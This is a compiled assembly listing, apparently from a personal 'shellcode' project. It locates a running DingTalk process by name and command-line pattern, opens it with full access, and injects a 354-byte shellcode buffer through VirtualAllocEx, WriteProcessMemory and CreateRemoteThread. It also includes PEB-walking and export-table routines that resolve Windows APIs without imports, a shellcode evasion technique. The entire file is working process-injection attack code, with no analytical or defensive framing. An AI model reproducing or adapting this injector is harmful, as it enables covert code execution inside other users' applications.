	mov	edx, DWORD PTR _nImageNameLength$[ebp]
	add	edx, 1
	mov	DWORD PTR _nImageNameLength$[ebp], edx
$LN6@main:
	mov	eax, DWORD PTR _nImageNameLength$[ebp]
	mov	ecx, DWORD PTR _pImageName$[ebp]
	movzx	edx, WORD PTR [ecx+eax*2]
	test	edx, edx
	je	SHORT $LN5@main
	jmp	SHORT $LN4@main
$LN5@main:
; Line 209
	cmp	DWORD PTR _nImageNameLength$[ebp], 12	; 0000000cH
	je	SHORT $LN30@main
; Line 210
	jmp	SHORT $LN2@main
$LN30@main:
; Line 212
	mov	DWORD PTR _isDingtalk$6[ebp], 1
; Line 213
	mov	DWORD PTR _nIndex$15[ebp], 0
	jmp	SHORT $LN9@main
$LN7@main:
	mov	eax, DWORD PTR _nIndex$15[ebp]
	add	eax, 1
	mov	DWORD PTR _nIndex$15[ebp], eax
$LN9@main:
	mov	ecx, DWORD PTR _nIndex$15[ebp]
	cmp	ecx, DWORD PTR _nImageNameLength$[ebp]
	jge	SHORT $LN8@main
; Line 214
	mov	edx, DWORD PTR _nIndex$15[ebp]
	mov	eax, DWORD PTR _pImageName$[ebp]
	movzx	ecx, WORD PTR [eax+edx*2]
	mov	edx, DWORD PTR _nIndex$15[ebp]
	movzx	eax, WORD PTR _dingtalk$[ebp+edx*2]
	cmp	ecx, eax
	je	SHORT $LN31@main
	mov	ecx, DWORD PTR _nIndex$15[ebp]
	mov	edx, DWORD PTR _pImageName$[ebp]
	movzx	eax, WORD PTR [edx+ecx*2]
	mov	ecx, DWORD PTR _nIndex$15[ebp]
	movzx	edx, WORD PTR _dingtalk_upper$[ebp+ecx*2]
	cmp	eax, edx
	je	SHORT $LN31@main
; Line 215
	mov	DWORD PTR _isDingtalk$6[ebp], 0
; Line 216
	jmp	SHORT $LN8@main
$LN31@main:
; Line 218
	jmp	SHORT $LN7@main
$LN8@main:
; Line 220
	cmp	DWORD PTR _isDingtalk$6[ebp], 0
	jne	SHORT $LN32@main
; Line 221
	jmp	$LN2@main
$LN32@main:
; Line 225
	mov	eax, DWORD PTR _pSystemInformation$[ebp]
	mov	ecx, DWORD PTR [eax+68]
	mov	DWORD PTR _dwID$[ebp], ecx
; Line 226
	mov	edx, DWORD PTR _dwID$[ebp]
	push	edx
	push	0
	push	1040					; 00000410H
	call	DWORD PTR __OpenProcess$[ebp]
	mov	DWORD PTR _hProcess$[ebp], eax
; Line 227
	push	0
	push	24					; 00000018H
	lea	eax, DWORD PTR _pbi$[ebp]
	push	eax
	push	0
	mov	ecx, DWORD PTR _hProcess$[ebp]
	push	ecx
	call	DWORD PTR _fNtQueryInformationProcess$[ebp]
	mov	DWORD PTR _status2$3[ebp], eax
; Line 228
	cmp	DWORD PTR _status2$3[ebp], 0
	je	SHORT $LN33@main
; Line 230
	jmp	$LN2@main
$LN33@main:
; Line 233
	mov	DWORD PTR _nPebIndex$11[ebp], 0
	jmp	SHORT $LN12@main
$LN10@main:
	mov	edx, DWORD PTR _nPebIndex$11[ebp]
	add	edx, 1
	mov	DWORD PTR _nPebIndex$11[ebp], edx
$LN12@main:
	cmp	DWORD PTR _nPebIndex$11[ebp], 472	; 000001d8H
	jae	SHORT $LN11@main
; Line 234
	mov	eax, DWORD PTR _nPebIndex$11[ebp]
	mov	BYTE PTR _peb$1[ebp+eax], 0
; Line 235
	jmp	SHORT $LN10@main
$LN11@main:
; Line 237
	mov	DWORD PTR _nParamIndex$10[ebp], 0
	jmp	SHORT $LN15@main
$LN13@main:
	mov	ecx, DWORD PTR _nParamIndex$10[ebp]
	add	ecx, 1
	mov	DWORD PTR _nParamIndex$10[ebp], ecx
$LN15@main:
	cmp	DWORD PTR _nParamIndex$10[ebp], 72	; 00000048H
	jae	SHORT $LN14@main
; Line 238
	mov	edx, DWORD PTR _nParamIndex$10[ebp]
	mov	BYTE PTR _Param$2[ebp+edx], 0
; Line 239
	jmp	SHORT $LN13@main
$LN14@main:
; Line 240
	xor	eax, eax
	mov	WORD PTR _usCmdLen$5[ebp], ax
; Line 241
	xor	ecx, ecx
	mov	WORD PTR _usPathLen$4[ebp], cx
; Line 242
	mov	DWORD PTR _dwRead$16[ebp], 0
; Line 243
	lea	edx, DWORD PTR _dwRead$16[ebp]
	push	edx
	push	472					; 000001d8H
	lea	eax, DWORD PTR _peb$1[ebp]
	push	eax
	mov	ecx, DWORD PTR _pbi$[ebp+4]
	push	ecx
	mov	edx, DWORD PTR _hProcess$[ebp]
	push	edx
	call	DWORD PTR __ReadProcessMemory$[ebp]
; Line 244
	cmp	DWORD PTR _dwRead$16[ebp], 0
	jne	SHORT $LN34@main
; Line 245
	jmp	$LN2@main
$LN34@main:
; Line 247
	mov	DWORD PTR _dwRead$16[ebp], 0
; Line 248
	lea	eax, DWORD PTR _dwRead$16[ebp]
	push	eax
	push	72					; 00000048H
	lea	ecx, DWORD PTR _Param$2[ebp]
	push	ecx
	mov	edx, DWORD PTR _peb$1[ebp+16]
	push	edx
	mov	eax, DWORD PTR _hProcess$[ebp]
	push	eax
	call	DWORD PTR __ReadProcessMemory$[ebp]
; Line 249
	cmp	DWORD PTR _dwRead$16[ebp], 0
	jne	SHORT $LN35@main
; Line 250
	jmp	$LN2@main
$LN35@main:
; Line 252
	movzx	ecx, WORD PTR _Param$2[ebp+64]
	test	ecx, ecx
	jne	SHORT $LN36@main
; Line 253
	jmp	$LN2@main
$LN36@main:
; Line 255
	movzx	edx, WORD PTR _Param$2[ebp+66]
	shl	edx, 1
	mov	DWORD PTR _dwBufferLength$8[ebp], edx
; Line 256
	push	4
	push	4096					; 00001000H
	mov	eax, DWORD PTR _dwBufferLength$8[ebp]
	push	eax
	push	0
	call	DWORD PTR __VirtualAlloc$[ebp]
	mov	DWORD PTR _pCmdLine$13[ebp], eax
; Line 257
	cmp	DWORD PTR _pCmdLine$13[ebp], 0
	jne	SHORT $LN37@main
; Line 258
	jmp	$LN2@main
$LN37@main:
; Line 260
	mov	DWORD PTR _nByteIndex$12[ebp], 0
	jmp	SHORT $LN18@main
$LN16@main:
	mov	ecx, DWORD PTR _nByteIndex$12[ebp]
	add	ecx, 1
	mov	DWORD PTR _nByteIndex$12[ebp], ecx
$LN18@main:
	mov	edx, DWORD PTR _nByteIndex$12[ebp]
	cmp	edx, DWORD PTR _dwBufferLength$8[ebp]
	jae	SHORT $LN17@main
; Line 261
	mov	eax, DWORD PTR _pCmdLine$13[ebp]
	add	eax, DWORD PTR _nByteIndex$12[ebp]
	mov	BYTE PTR [eax], 0
; Line 262
	jmp	SHORT $LN16@main
$LN17@main:
; Line 263
	mov	DWORD PTR _dwRead$16[ebp], 0
; Line 264
	lea	ecx, DWORD PTR _dwRead$16[ebp]
	push	ecx
	movzx	edx, WORD PTR _Param$2[ebp+64]
	push	edx
	mov	eax, DWORD PTR _pCmdLine$13[ebp]
	push	eax
	mov	ecx, DWORD PTR _Param$2[ebp+68]
	push	ecx
	mov	edx, DWORD PTR _hProcess$[ebp]
	push	edx
	call	DWORD PTR __ReadProcessMemory$[ebp]
; Line 265
	cmp	DWORD PTR _dwRead$16[ebp], 0
	jne	SHORT $LN38@main
; Line 266
	jmp	$LN2@main
$LN38@main:
; Line 268
	mov	eax, DWORD PTR _pCmdLine$13[ebp]
	mov	DWORD PTR _pIndexOfCmdLine$9[ebp], eax
$LN19@main:
; Line 271
	mov	ecx, DWORD PTR _pIndexOfCmdLine$9[ebp]
	movzx	edx, WORD PTR [ecx]
	test	edx, edx
	je	SHORT $LN20@main
; Line 272
	mov	DWORD PTR _bMatch$7[ebp], 1
; Line 273
	mov	DWORD PTR _nCount$14[ebp], 0
	jmp	SHORT $LN23@main
$LN21@main:
	mov	eax, DWORD PTR _nCount$14[ebp]
	add	eax, 1
	mov	DWORD PTR _nCount$14[ebp], eax
$LN23@main:
	mov	ecx, DWORD PTR _nCount$14[ebp]
	cmp	ecx, DWORD PTR _dwPatternLength$[ebp]
	jae	SHORT $LN22@main
; Line 274
	mov	edx, DWORD PTR _nCount$14[ebp]
	mov	eax, DWORD PTR _pIndexOfCmdLine$9[ebp]
	movzx	ecx, WORD PTR [eax+edx*2]
	mov	edx, DWORD PTR _nCount$14[ebp]
	movzx	eax, WORD PTR _dingtalk_pattern$[ebp+edx*2]
	cmp	ecx, eax
	je	SHORT $LN39@main
; Line 275
	mov	DWORD PTR _bMatch$7[ebp], 0
; Line 276
	jmp	SHORT $LN22@main
$LN39@main:
; Line 278
	jmp	SHORT $LN21@main
$LN22@main:
; Line 279
	cmp	DWORD PTR _bMatch$7[ebp], 0
	je	SHORT $LN40@main
; Line 280
	mov	ecx, DWORD PTR _dwID$[ebp]
	mov	DWORD PTR _dwNetWorkInstPID$[ebp], ecx
; Line 281
	jmp	SHORT $LN20@main
$LN40@main:
; Line 283
	mov	edx, DWORD PTR _pIndexOfCmdLine$9[ebp]
	add	edx, 2
	mov	DWORD PTR _pIndexOfCmdLine$9[ebp], edx
; Line 284
	jmp	SHORT $LN19@main
$LN20@main:
; Line 285
	push	32768					; 00008000H
	mov	eax, DWORD PTR _dwBufferLength$8[ebp]
	push	eax
	mov	ecx, DWORD PTR _pCmdLine$13[ebp]
	push	ecx
	call	DWORD PTR __VirtualFree$[ebp]
; Line 286
	cmp	DWORD PTR _dwNetWorkInstPID$[ebp], 0
	je	SHORT $LN41@main
; Line 287
	jmp	SHORT $LN3@main
$LN41@main:
; Line 289
	jmp	$LN2@main
$LN3@main:
; Line 290
	push	32768					; 00008000H
	push	1048576					; 00100000H
	mov	edx, DWORD PTR _pInfo$[ebp]
	push	edx
	call	DWORD PTR __VirtualFree$[ebp]
; Line 292
	cmp	DWORD PTR _dwNetWorkInstPID$[ebp], 0
	jne	SHORT $LN42@main
; Line 293
	mov	eax, 1
	jmp	SHORT $LN1@main
$LN42@main:
; Line 296
	mov	eax, DWORD PTR _dwNetWorkInstPID$[ebp]
	push	eax
	push	0
	push	2097151					; 001fffffH
	call	DWORD PTR __OpenProcess$[ebp]
	mov	DWORD PTR _TargetProcess$[ebp], eax
; Line 297
	push	4
	push	4096					; 00001000H
	push	354					; 00000162H
	push	0
	mov	ecx, DWORD PTR _TargetProcess$[ebp]
	push	ecx
	call	DWORD PTR _fn_VirtualAllocEx$[ebp]
	mov	DWORD PTR _AllocMemory$[ebp], eax
; Line 298
	push	0
	push	354					; 00000162H
	lea	edx, DWORD PTR _shellcode$[ebp]
	push	edx
	mov	eax, DWORD PTR _AllocMemory$[ebp]
	push	eax
	mov	ecx, DWORD PTR _TargetProcess$[ebp]
	push	ecx
	call	DWORD PTR _fn_WriteProcessMemory$[ebp]
; Line 299
	push	0
	push	0
	push	0
	mov	edx, DWORD PTR _AllocMemory$[ebp]
	push	edx
	push	0
	push	0
	mov	eax, DWORD PTR _TargetProcess$[ebp]
	push	eax
	call	DWORD PTR _fn_CreateRemoteThread$[ebp]
; Line 311
	xor	eax, eax
$LN1@main:
; Line 312
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_func_by_name@@YAPAXPAXPAD@Z
_TEXT	SEGMENT
_funcRVA$1 = -60					; size = 4
_nameRVA$2 = -56					; size = 4
_nameIndex$3 = -52					; size = 4
_funcsListRVA$ = -48					; size = 4
_namesOrdsListRVA$ = -44				; size = 4
_funcNamesListRVA$ = -40				; size = 4
_namesCount$ = -36					; size = 4
_expAddr$ = -32						; size = 4
_nt_headers$ = -28					; size = 4
_exportsDir$ = -24					; size = 4
_idh$ = -20						; size = 4
_curr_name$4 = -16					; size = 4
_exp$ = -12						; size = 4
_i$5 = -8						; size = 4
_k$6 = -4						; size = 4
_module$ = 8						; size = 4
_func_name$ = 12					; size = 4
?get_func_by_name@@YAPAXPAXPAD@Z PROC			; get_func_by_name, COMDAT
; File c:\users\ronpa\desktop\shellcode\shellcode\peb-lookup.h
; Line 170
	push	ebp
	mov	ebp, esp
	sub	esp, 60					; 0000003cH
; Line 171
	mov	eax, DWORD PTR _module$[ebp]
	mov	DWORD PTR _idh$[ebp], eax
; Line 172
	mov	ecx, DWORD PTR _idh$[ebp]
	movzx	edx, WORD PTR [ecx]
	cmp	edx, 23117				; 00005a4dH
	je	SHORT $LN8@get_func_b
; Line 173
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN8@get_func_b:
; Line 175
	mov	eax, DWORD PTR _idh$[ebp]
	mov	ecx, DWORD PTR _module$[ebp]
	add	ecx, DWORD PTR [eax+60]
	mov	DWORD PTR _nt_headers$[ebp], ecx
; Line 176
	mov	edx, 8
	imul	eax, edx, 0
	mov	ecx, DWORD PTR _nt_headers$[ebp]
	lea	edx, DWORD PTR [ecx+eax+120]
	mov	DWORD PTR _exportsDir$[ebp], edx
; Line 177
	mov	eax, DWORD PTR _exportsDir$[ebp]
	cmp	DWORD PTR [eax], 0
	jne	SHORT $LN9@get_func_b
; Line 178
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN9@get_func_b:
; Line 181
	mov	ecx, DWORD PTR _exportsDir$[ebp]
	mov	edx, DWORD PTR [ecx]
	mov	DWORD PTR _expAddr$[ebp], edx
; Line 182
	mov	eax, DWORD PTR _expAddr$[ebp]
	add	eax, DWORD PTR _module$[ebp]
	mov	DWORD PTR _exp$[ebp], eax
; Line 183
	mov	ecx, DWORD PTR _exp$[ebp]
	mov	edx, DWORD PTR [ecx+24]
	mov	DWORD PTR _namesCount$[ebp], edx
; Line 185
	mov	eax, DWORD PTR _exp$[ebp]
	mov	ecx, DWORD PTR [eax+28]
	mov	DWORD PTR _funcsListRVA$[ebp], ecx
; Line 186
	mov	edx, DWORD PTR _exp$[ebp]
	mov	eax, DWORD PTR [edx+32]
	mov	DWORD PTR _funcNamesListRVA$[ebp], eax
; Line 187
	mov	ecx, DWORD PTR _exp$[ebp]
	mov	edx, DWORD PTR [ecx+36]
	mov	DWORD PTR _namesOrdsListRVA$[ebp], edx
; Line 190
	mov	DWORD PTR _i$5[ebp], 0
	jmp	SHORT $LN4@get_func_b
$LN2@get_func_b:
	mov	eax, DWORD PTR _i$5[ebp]
	add	eax, 1
	mov	DWORD PTR _i$5[ebp], eax
$LN4@get_func_b:
	mov	ecx, DWORD PTR _i$5[ebp]
	cmp	ecx, DWORD PTR _namesCount$[ebp]
	jae	$LN3@get_func_b
; Line 191
	mov	edx, DWORD PTR _module$[ebp]
	add	edx, DWORD PTR _funcNamesListRVA$[ebp]
	mov	eax, DWORD PTR _i$5[ebp]
	lea	ecx, DWORD PTR [edx+eax*4]
	mov	DWORD PTR _nameRVA$2[ebp], ecx
; Line 192
	mov	edx, DWORD PTR _module$[ebp]
	add	edx, DWORD PTR _namesOrdsListRVA$[ebp]
	mov	eax, DWORD PTR _i$5[ebp]
	lea	ecx, DWORD PTR [edx+eax*2]
	mov	DWORD PTR _nameIndex$3[ebp], ecx
; Line 193
	mov	edx, DWORD PTR _module$[ebp]
	add	edx, DWORD PTR _funcsListRVA$[ebp]
	mov	eax, DWORD PTR _nameIndex$3[ebp]
	movzx	ecx, WORD PTR [eax]
	lea	edx, DWORD PTR [edx+ecx*4]
	mov	DWORD PTR _funcRVA$1[ebp], edx
; Line 195
	mov	eax, DWORD PTR _nameRVA$2[ebp]
	mov	ecx, DWORD PTR _module$[ebp]
	add	ecx, DWORD PTR [eax]
	mov	DWORD PTR _curr_name$4[ebp], ecx
; Line 196
	mov	DWORD PTR _k$6[ebp], 0
; Line 197
	mov	DWORD PTR _k$6[ebp], 0
	jmp	SHORT $LN7@get_func_b
$LN5@get_func_b:
	mov	edx, DWORD PTR _k$6[ebp]
	add	edx, 1
	mov	DWORD PTR _k$6[ebp], edx
$LN7@get_func_b:
	mov	eax, DWORD PTR _func_name$[ebp]
	add	eax, DWORD PTR _k$6[ebp]
	movsx	ecx, BYTE PTR [eax]
	test	ecx, ecx
	je	SHORT $LN6@get_func_b
	mov	edx, DWORD PTR _curr_name$4[ebp]
	add	edx, DWORD PTR _k$6[ebp]
	movsx	eax, BYTE PTR [edx]
	test	eax, eax
	je	SHORT $LN6@get_func_b
; Line 198
	mov	ecx, DWORD PTR _func_name$[ebp]
	add	ecx, DWORD PTR _k$6[ebp]
	movsx	edx, BYTE PTR [ecx]
	mov	eax, DWORD PTR _curr_name$4[ebp]
	add	eax, DWORD PTR _k$6[ebp]
	movsx	ecx, BYTE PTR [eax]
	cmp	edx, ecx
	je	SHORT $LN10@get_func_b
	jmp	SHORT $LN6@get_func_b
$LN10@get_func_b:
; Line 199
	jmp	SHORT $LN5@get_func_b
$LN6@get_func_b:
; Line 200
	mov	edx, DWORD PTR _func_name$[ebp]
	add	edx, DWORD PTR _k$6[ebp]
	movsx	eax, BYTE PTR [edx]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
	mov	ecx, DWORD PTR _curr_name$4[ebp]
	add	ecx, DWORD PTR _k$6[ebp]
	movsx	edx, BYTE PTR [ecx]
	test	edx, edx
	jne	SHORT $LN11@get_func_b
; Line 202
	mov	eax, DWORD PTR _funcRVA$1[ebp]
	mov	ecx, DWORD PTR _module$[ebp]
	add	ecx, DWORD PTR [eax]
	mov	eax, ecx
	jmp	SHORT $LN1@get_func_b
$LN11@get_func_b:
; Line 204
	jmp	$LN2@get_func_b
$LN3@get_func_b:
; Line 205
	xor	eax, eax
$LN1@get_func_b:
; Line 206
	mov	esp, ebp
	pop	ebp
	ret	0
?get_func_by_name@@YAPAXPAXPAD@Z ENDP			; get_func_by_name
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_module_by_name@@YAPAXPA_W@Z
_TEXT	SEGMENT
_list$ = -52						; size = 8
_Flink$ = -44						; size = 4
_ldr$ = -40						; size = 4
tv151 = -36						; size = 4
tv132 = -32						; size = 4
_peb$ = -28						; size = 4
_curr_module$ = -24					; size = 4
_curr_name$1 = -20					; size = 4
_i$2 = -16						; size = 4
_c2$3 = -12						; size = 2
_c1$4 = -8						; size = 2
tv155 = -4						; size = 2
tv136 = -2						; size = 2
_module_name$ = 8					; size = 4
?get_module_by_name@@YAPAXPA_W@Z PROC			; get_module_by_name, COMDAT
; File c:\users\ronpa\desktop\shellcode\shellcode\peb-lookup.h
; Line 135
	push	ebp
	mov	ebp, esp
	sub	esp, 52					; 00000034H
; Line 136
	mov	DWORD PTR _peb$[ebp], 0
; Line 140
	assume fs:nothing
	mov	eax, DWORD PTR fs:[48]
	mov	DWORD PTR _peb$[ebp], eax
; Line 142
	mov	ecx, DWORD PTR _peb$[ebp]
	mov	edx, DWORD PTR [ecx+12]
	mov	DWORD PTR _ldr$[ebp], edx
; Line 143
	mov	eax, DWORD PTR _ldr$[ebp]
	mov	ecx, DWORD PTR [eax+12]
	mov	edx, DWORD PTR [eax+16]
	mov	DWORD PTR _list$[ebp], ecx
	mov	DWORD PTR _list$[ebp+4], edx
; Line 145
	mov	eax, DWORD PTR _list$[ebp]
	mov	DWORD PTR _Flink$[ebp], eax
; Line 146
	mov	ecx, DWORD PTR _Flink$[ebp]
	mov	DWORD PTR _curr_module$[ebp], ecx
$LN2@get_module:
; Line 148
	cmp	DWORD PTR _curr_module$[ebp], 0
	je	$LN3@get_module
	mov	edx, DWORD PTR _curr_module$[ebp]
	cmp	DWORD PTR [edx+24], 0
	je	$LN3@get_module
; Line 149
	mov	eax, DWORD PTR _curr_module$[ebp]
	cmp	DWORD PTR [eax+48], 0
	jne	SHORT $LN7@get_module
	jmp	SHORT $LN2@get_module
$LN7@get_module:
; Line 150
	mov	ecx, DWORD PTR _curr_module$[ebp]
	mov	edx, DWORD PTR [ecx+48]
	mov	DWORD PTR _curr_name$1[ebp], edx
; Line 152
	mov	DWORD PTR _i$2[ebp], 0
; Line 153
	mov	DWORD PTR _i$2[ebp], 0
	jmp	SHORT $LN6@get_module
$LN4@get_module:
	mov	eax, DWORD PTR _i$2[ebp]
	add	eax, 1
	mov	DWORD PTR _i$2[ebp], eax
$LN6@get_module:
	mov	ecx, DWORD PTR _i$2[ebp]
	mov	edx, DWORD PTR _module_name$[ebp]
	movzx	eax, WORD PTR [edx+ecx*2]
	test	eax, eax
	je	$LN5@get_module
	mov	ecx, DWORD PTR _i$2[ebp]
	mov	edx, DWORD PTR _curr_name$1[ebp]
	movzx	eax, WORD PTR [edx+ecx*2]
	test	eax, eax
	je	$LN5@get_module
; Line 155
	mov	ecx, DWORD PTR _i$2[ebp]
	mov	edx, DWORD PTR _module_name$[ebp]
	movzx	eax, WORD PTR [edx+ecx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN11@get_module
	mov	ecx, DWORD PTR _i$2[ebp]
	mov	edx, DWORD PTR _module_name$[ebp]
	movzx	eax, WORD PTR [edx+ecx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN11@get_module
	mov	ecx, DWORD PTR _i$2[ebp]
	mov	edx, DWORD PTR _module_name$[ebp]
	movzx	eax, WORD PTR [edx+ecx*2]
	add	eax, 32					; 00000020H
	mov	DWORD PTR tv132[ebp], eax
	mov	ecx, DWORD PTR _i$2[ebp]
	mov	edx, DWORD PTR _module_name$[ebp]
	mov	ax, WORD PTR tv132[ebp]
	mov	WORD PTR [edx+ecx*2], ax
	mov	cx, WORD PTR tv132[ebp]
	mov	WORD PTR tv136[ebp], cx
	jmp	SHORT $LN12@get_module
$LN11@get_module:
	mov	edx, DWORD PTR _i$2[ebp]
	mov	eax, DWORD PTR _module_name$[ebp]
	mov	cx, WORD PTR [eax+edx*2]
	mov	WORD PTR tv136[ebp], cx
$LN12@get_module:
	mov	dx, WORD PTR tv136[ebp]
	mov	WORD PTR _c1$4[ebp], dx
; Line 156
	mov	eax, DWORD PTR _i$2[ebp]
	mov	ecx, DWORD PTR _curr_name$1[ebp]
	movzx	edx, WORD PTR [ecx+eax*2]
	cmp	edx, 90					; 0000005aH
	jg	SHORT $LN13@get_module
	mov	eax, DWORD PTR _i$2[ebp]
	mov	ecx, DWORD PTR _curr_name$1[ebp]
	movzx	edx, WORD PTR [ecx+eax*2]
	cmp	edx, 65					; 00000041H
	jl	SHORT $LN13@get_module
	mov	eax, DWORD PTR _i$2[ebp]
	mov	ecx, DWORD PTR _curr_name$1[ebp]
	movzx	edx, WORD PTR [ecx+eax*2]
	add	edx, 32					; 00000020H
	mov	DWORD PTR tv151[ebp], edx
	mov	eax, DWORD PTR _i$2[ebp]
	mov	ecx, DWORD PTR _curr_name$1[ebp]
	mov	dx, WORD PTR tv151[ebp]
	mov	WORD PTR [ecx+eax*2], dx
	mov	ax, WORD PTR tv151[ebp]
	mov	WORD PTR tv155[ebp], ax
	jmp	SHORT $LN14@get_module
$LN13@get_module:
	mov	ecx, DWORD PTR _i$2[ebp]
	mov	edx, DWORD PTR _curr_name$1[ebp]
	mov	ax, WORD PTR [edx+ecx*2]
	mov	WORD PTR tv155[ebp], ax
$LN14@get_module:
	mov	cx, WORD PTR tv155[ebp]
	mov	WORD PTR _c2$3[ebp], cx
; Line 157
	movzx	edx, WORD PTR _c1$4[ebp]
	movzx	eax, WORD PTR _c2$3[ebp]
	cmp	edx, eax
	je	SHORT $LN8@get_module
	jmp	SHORT $LN5@get_module
$LN8@get_module:
; Line 158
	jmp	$LN4@get_module
$LN5@get_module:
; Line 159
	mov	ecx, DWORD PTR _i$2[ebp]
	mov	edx, DWORD PTR _module_name$[ebp]
	movzx	eax, WORD PTR [edx+ecx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
	mov	ecx, DWORD PTR _i$2[ebp]
	mov	edx, DWORD PTR _curr_name$1[ebp]
	movzx	eax, WORD PTR [edx+ecx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
; Line 161
	mov	ecx, DWORD PTR _curr_module$[ebp]
	mov	eax, DWORD PTR [ecx+24]
	jmp	SHORT $LN1@get_module
$LN9@get_module:
; Line 164
	mov	edx, DWORD PTR _curr_module$[ebp]
	mov	eax, DWORD PTR [edx]
	mov	DWORD PTR _curr_module$[ebp], eax
; Line 165
	jmp	$LN2@get_module
$LN3@get_module:
; Line 166
	xor	eax, eax
$LN1@get_module:
; Line 167
	mov	esp, ebp
	pop	ebp
	ret	0
?get_module_by_name@@YAPAXPA_W@Z ENDP			; get_module_by_name
_TEXT	ENDS
END
